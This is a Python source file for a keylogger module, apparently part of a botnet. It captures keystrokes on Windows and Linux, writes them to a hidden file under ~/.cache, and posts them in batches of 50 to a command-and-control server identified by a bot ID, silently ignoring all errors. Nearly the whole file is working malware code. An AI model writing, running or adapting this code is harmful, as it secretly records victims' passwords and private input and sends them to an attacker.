#!/usr/bin/env python3
# KEYLOGGER MODULE - Record keyboard input
import os
import sys
import time
import threading
from datetime import datetime

class Keylogger:
    def __init__(self, c2_server=None, bot_id=None):
        self.c2_server = c2_server
        self.bot_id = bot_id
        self.log_file = os.path.expanduser("~/.cache/.keylog")
        self.running = False
        self.buffer = []
        os.makedirs(os.path.dirname(self.log_file), exist_ok=True)
    
    def start_linux(self):
        """Start keylogger on Linux"""
        try:
            import termios
            import tty
            import fcntl
            
            fd = sys.stdin.fileno()
            old_settings = termios.tcgetattr(fd)
            tty.setraw(fd)
            
            while self.running:
                try:
                    ch = sys.stdin.read(1)
                    if ch:
                        self.log_key(ch)
                except:
                    pass
        except:
            pass
    
    def start_windows(self):
        """Start keylogger on Windows"""
        try:
            from pynput.keyboard import Listener
            
            def on_press(key):
                self.log_key(str(key))
            
            with Listener(on_press=on_press) as listener:
                listener.join()
        except:
            pass
    
    def log_key(self, key):
        """Log keystroke"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry = f"[{timestamp}] {key}\n"
        self.buffer.append(entry)
        
        # Write to file
        with open(self.log_file, 'a') as f:
            f.write(entry)
        
        # Send to C2 every 50 keystrokes
        if len(self.buffer) >= 50:
            self.flush()
    
    def flush(self):
        """Send buffered keystrokes to C2"""
        if not self.c2_server or not self.bot_id:
            self.buffer = []
            return
        
        try:
            import requests
            data = {
                "bot_id": self.bot_id,
                "keystrokes": "".join(self.buffer),
                "timestamp": str(datetime.now())
            }
            requests.post(f"{self.c2_server}/api/keylog", json=data, timeout=30)
            self.buffer = []
        except:
            pass
    
    def start(self):
        """Start keylogger"""
        self.running = True
        print(f"[*] Keylogger started, logs: {self.log_file}")
        
        if sys.platform == 'win32':
            self.start_windows()
        else:
            self.start_linux()
    
    def stop(self):
        """Stop keylogger"""
        self.running = False
        self.flush()
